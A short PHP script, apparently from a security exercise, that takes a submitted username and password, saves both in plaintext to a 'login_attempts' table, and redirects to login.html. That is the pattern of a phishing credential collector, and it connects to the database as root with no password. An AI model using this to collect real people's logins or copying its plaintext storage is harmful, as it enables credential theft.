<?php

$conn = new mysqli("localhost", "root", "", "infosec_db");


if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}


$username = $_POST['username'];
$password = $_POST['password'];


$stmt = $conn->prepare("INSERT INTO login_attempts (username, password) VALUES (?, ?)");
if ($stmt === false) {
    die("Prepare failed: " . $conn->error);
}


$stmt->bind_param("ss", $username, $password);


if ($stmt->execute()) {
    echo "Data inserted successfully!";
    
    header("Location: login.html");
    exit();
} else {
    echo "Failed to insert data: " . $stmt->error;
}


$conn->close();
?>
